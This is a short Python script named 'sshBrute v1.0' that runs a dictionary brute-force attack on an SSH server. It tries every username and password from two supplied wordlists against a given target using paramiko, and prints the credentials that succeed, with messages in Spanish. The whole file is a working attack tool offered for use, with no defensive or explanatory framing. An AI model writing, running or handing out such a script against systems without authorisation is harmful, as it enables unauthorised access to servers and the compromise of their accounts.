#!/usr/bin/python

# sshBrute v1.0, Author @guguvk (Axel González)

import paramiko, argparse, socket

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--user", required=True, help="wordlist for the user")
parser.add_argument("-p", "--password", required=True, help="wordlist for the password")
parser.add_argument("-t", "--target", required=True, help="ssh target")
args = parser.parse_args()

try:
    with open(args.user, "r") as u:
        users = u.read().splitlines()
    with open(args.password, "r") as p:
        passwords = p.read().splitlines()

    for user in users:
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(args.target, username=user, password=password)
                print(f"\nCredenciales encontradas\nusuario: %s\ncontraseña: %s" %(user,password))
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"Fallo: %s %s" %(user,password))
            except paramiko.SSHException as e:
                print(e)
            except socket.error as e:
                print(f"Error de conexión: {e}")
                break

except FileNotFoundError as e:
    print(f"Archivo no encontrado: {e}")
except Exception as e:
    print(e)

